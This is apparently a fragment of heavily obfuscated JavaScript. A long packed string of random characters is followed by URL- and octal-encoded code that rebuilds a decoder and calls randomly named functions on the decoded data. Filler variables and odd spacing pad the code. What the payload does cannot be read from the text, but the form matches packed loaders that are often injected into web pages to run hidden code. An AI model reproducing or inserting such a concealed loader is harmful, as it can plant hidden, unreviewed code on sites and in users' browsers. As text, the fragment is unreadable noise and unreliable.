fWI0m;eI(II+LFI-igNUXKP{Aj4Q<t/HKh8rXPeHQswyck~xNw|W`CHm}#HobHqt<Hk}ZvOpQ8I yYK\nJ\\NhL"JeH0|yJSmOXeV*HYP5O0I9INLRk\'HXV,aTfJD~xJFulJHqJkZniJ=I[uaaQ8LEV,P5sZ;o!LMtL Jc}7GJEL%LR~V4z\'r]jGzbJz_J_qX0R.sS|q%|hYsZUR$zy_0G8TA_Z_y]0TOYdjOGFSmgI.{`LQ)f,Q,Qe*e.JLo:GRjluTP%XG&Yj#Q]cQ_n4bpFyvQdrLQf{}3Q`{#c-z*jpm?n6c{H+LLjS|GPNGT{_GVe)Q+Q-G[IqHqmrQyGaw[dP&w~UGfhapLHJ^pJbS{uu{zuV?RQt]Q(FGYcQ.fNFG]nFcEG`pLGcP\'Fln)uTFn)q9bbFM\'Fm?r;s(|eF"a:F$Q*F&f/QH5e0JMcF.r5F0FQ4FIwkRFG {?J^bq@FTJ2FVq8bebwc=lsJ[FUJ]F]FXFbF[Fdkj1HGF?j`k	FtNFF>uGTFFDF	FGQFIq8Fmk/k,FF/FGdF2j"FaFZ{*]\\FWb8FgEF\\FjcKaEFYr5F6EEEFcj[FkaHHaFoF;FqF=zq?FtzbFCGXFxf1G\\F{rMFKbxF~qEzbFMEF1FPl[EFhEEE]XE\nbfFRkE8E\rFib]EF5EE>F_EizbEI%Fx_VLFAzzGWvKFEe,E*F*E,lfgE2GbE4FOP)FQ<z9EE=F]EdEciEeE	EgEjnvq\nEMYgF<uVJERFvE(GZFyIrQYq8z~FLE^FGenNs&EdE<ElkEhDEBEfDEn/z~F:ENFrzH3FuE\'EUE)F)FHE|s	wE]FDEo3qd#k4z/zck9.{VrytmkDq|=_s){Wk>zaD(rtD+{|D-vkaEqXE!uhR}gEOz-e\'DFDx_h3u8V8DC4E%tDFEyEXDk-pLGFn6DFNDj"k/D\nEGE9J^D	EjDEq9EhGtD\\rLDErDBSno<DSG+ETDVF\'F\nDYqD[FD]b qKED!E6DajDDoUDpDAiLDKNBM.EvDUEVF(JKEZD~Gzn)D^E_D`D#k/lEkDj/CF8^BCv"DrE#H%DvF#DxCD{FzD<Cq-ED ECCJUk]JXkzbDiEDGtH<aVVC&PQYuBw~zQz\'#Mp[zb|"si`K\'RDOQoImK.jZN\\l>U]PRiaLo|l\rRym]P[-CP)zMn\rjsJq7\'{RJZ<]Pv9q[\'v?R2EwDDWDC0y<equTjsF]Bzbd+s\r}JlQgA}JZhYYsDC>j[d(WCo	I%K\'PiCI|\'lYPqCNz\\_nXpuvCRL?r^[^MPCCUMBvIt%LOpzCor5LT}P\\Gv`q-[/v?CyDyFFDXC}zCt;BB-j[BjbG`{WQgxwLuTB[	n6yF{C\nBJ^Br(}PbE&C-DCE|jnBC5D_D"BRCC!BUZ^V#XKH|W,P*B/r;R	XZwZGC]9i5GG~yY{AGMi?^([8k,CYwVBueaNCrVbP[]ETTNeT5yaXCZtssGWZx^E\\9W L_k,rKu1xzff?|(:ATfLvGAX^YYY\rMj\\qXTY \\TK\r{]_GrRUKT&XhK1XVJ\nZ[|"WL\\XrY&ZZ>oT<C\\{ZXh`rTzyqWpny+M;|\'M{bq|IAHCsA%B{aAOWq7[YW]ARoR}A!R\'nDA#pI}(y{LZXMNIo8Ab}JAdCqZLAg^+ A"zR@nA^LJ#HU^eRku_HzNVB3[=]PJ@zrhtmpJAWLTAI_AsVy)y+C]ADTAVC\\oR]t\\pA[AJB7A_MvT_|2y@zbH]zLeTTLO_i	^vP\nQ=z3Q>rS]_a_@^2Vm_KM2MEByB|@\nK>XlBszWtZ^N^AW@\\}ERCc@uEJyQv\'{EOv|vyqs\\`q~MAl[xARv}"O{^sQrK@x_B1B@_pzAyt)hA@! z@$ujAnPwsuXj#F4T)sL1m[GvyaP#G#fqp>sBj^Srfk~~fmv fp{CeH|Aw{3_.vhT`pi?IA}pi@~NVyfw=fX[l~w[I|:\\Hl|/yxQ=XnAzbaVN9JqM"qSJyGH{y{CWHdMRx#{CC{QM^?*I;?4nOKQ8X,V(hOYWdfgw$i}Yz"T}frr;gLy~g\\qU$N>NMiXVP?R\\M@9^&O3TBpi{\\?^[tfG,IhG0IG2rBmia\\??[G<Xc@;{[yeY_X:?oR!X1si?piaLPsuq_.RJzyG:U~UZ@3_zS\'X)\\$u-lAuK]IW}_YG:]0v8Y)LNXR[-\'Jy0A,KUO(VJCG/GL%ls)^mOeDJse{rJv|eJx>Kx^I>)>.Jt>,zJwHZA\nL[Cl@JT5]Po!Jm>;i.WAA@AC@H@XPc>A?GSH>MClOWa6(@YNn[9`:{;`d@+^!x^@Yy+o!]P@^{]^W\'W\n{&^!CV_$Y,>AHTW~V/LL@ffJRoKreSv@Z>bKre@MA4O soW8reV=UKth;K@|8@\r>v>1JoKKZJ-K]V\rWEN%J,VshM]rX\n|ZeXa?p^%>wW0G5re?`o	E {{;YPT>X^UDOWO^|},=GH/?he$>%|>lp;Jr>5>+ez~wHJ]^/>4e=?te=B="Wqq|Y:G:Q5LK-{\\?|K\'tt^DZ#n7=4}6Ge">$>&=;a(>*e=I=AI{`^@=d=>=fUj=h>FWx=MMj=*>AkW._pg+>Pyz\'{;PYLB>OPm@TS`BnBx.=-?}_VvG=O_&=QLtpTV^`?(ebBxAV7B{wZL)NzS|KY>A+{\\bERL)Ap>?LzbN[@wQ4@yM@{vz>qK>sK!L*LdW7<W:z|=]i=WAOUL~T;K>yLH=ja$==V==Jz=V<I=T=X8=?v|]?\\H[I\r|2lx}S}RV6U2z|R|W|8}_xqsS>/z&G.=6yggsN~guV\\Dt{LWymxM<>[wu^qzYsxp+ymu:gypi>MChvqx;iiU/p+;f1Vzb;MFM	U\\^nf}7f<B*r(;?>t>zi)x=;kx?dx=nln&Wv?a{^I%;;iCJ;; gy?3;t&M%r(;%nno7;IRH\\x=o\no\niBhujj7~{}+Phz}G@f1zZujxekL-g{IlmJ0T\']TInP$cs+^S{wtLa1R|D\\hwwzt^FU;bgCg{wtF[iUh{`h`%x;_I0_RIq;b<kh/gryh2<oh5I6v<t_;r:P-?Hu9I:]>Ch{?`GEs)hvgy=_;y;{hXf#VDszx`(];^ktuyszL\npWVf{qs)AL>kLYztbv:s)r.rT<j:wh:!ETUwp:$=T=UyJ[z?FlTDzEzQXf8B&>m>pvL>[D/B%<.B*mP:KmrbovS?[KK:+Dx:>FFQE+Lpymz{u"r#\\[Rrzb[7trvK:g\\Byplf;?:sPsR@DpS]&^	pZ:iS(LER:m#Ksfrer r"}+rW]>r&KnMjjQkA-LzbkJMk=Nfgkk.c8d3q!hj5q\'~{q)p{Tkkt|<q;jpuTnMF]9 HqBc8c:G`bSb$bUneQ~reA/o!oNpAtZr9o:<ro=U7k_n\nUOoEi6k~SocSogoTkv;"kzAnk|kejl&9CSL9EoinPjFdYouc_dco|oxI?b>b@ndnnfn;-C9Dun9BDan9d9PR9eCj%nj;7n\'{@un;qAh99oFX9lvj6lyHbsj=H+kkkbeATkk\rx^O\'9y[iFe9kKp@InmXfAzb=_R{f$rfDxQ:?B=E{=z98j]aaixAtH\\uj9z[tLGEm#:J"RLt<w},<~x=?g>#?iL\'oQ*f1:?:[EYQYO]rL:Rb9!a:wTQ6{8~m8P8Q8R8S8T8U8V8W8X~~_8[8\\8]8^8_8`8a8b8c8d8e8f8g8h8i8j8k8l8m8n8o8p8q8r8s8t~ 8Y8w8x8y8z8{8|8}8U';gu3HM+=  '%30%2C%31%29%3B\154%31%5B%5Fl%5D%3Dl%30%5B\111%6C%5D%3Bif%28%6C%32%29%7B%6C%69%2B%3D%6C%30%5BI\154%5D%7D%3B\142r\145a%6B%3Bde%66%61%75%6C%74%3Al%31%5B%5Fl%5D%3D\154%30%5Bl%37%5B%5F%6C%5D%5D%3B%69f%28l%32%29%7Bl%69%2B%3Dl%30%5Bl%37%5B%5Fl%5D%5D%7D%3Bl%30%5B\111\154%5D%3Dl%30%5Bl\154%5D%2B\123\164%72\151ng%28\154%30%5B\154%37%5B%5Fl%5D%5D%29%2E\163\165%62s\164%72%28%30%2C%31%29%3B%62r%65\141%6B%7D%3B\111\154%2B%2B%3Bll%3D\154%37%5B%5Fl%5D%3B%5F%6C%2B%2B%7D%3B\151f%28%21\154%32%29%7Br%65t\165r%6E%28l%31%2E\152%6Fi\156%28%27%27%29%29%7D\145l%73%65%7Br\145t\165rn%20%6C\151%7D%7D%3B\166a\162%20\154O%3D%27%27%3B\146o%72%28\151%69%3D%30%3B\151%69%3C\144\143\121%35%30%35%46%76J%39%35%38\160%37%2Eleng%74\150%3Bi%69%2B%2B%29%7BlO%2B%3D%6C%33%28d%63\121%35%30%35\106vJ%39%35%38\160%37%5B\151\151%5D%29%7D%3B%65d%35b%38a\143%36%63%28%29%3B';i7D8e66BiGTXo      ='ODPGcnCLOcBObLVvOsOwwvxFbVxO';p7l2YW3n2='i664vcYxHTR9u';qVVoeIi643C72    (kbJonkV);i643C72qVVoeI  (gu3HM);imS4Z  (gu3HM);c3UMfRUWO+=  'sqxkZySfEOOOfWOSpLWIVrmxylvMYUmHcWSlJYPBTYytooaLHcOMFsFucOkR';uu3JY7O2nOW+=  'yncoLu0DYj4';
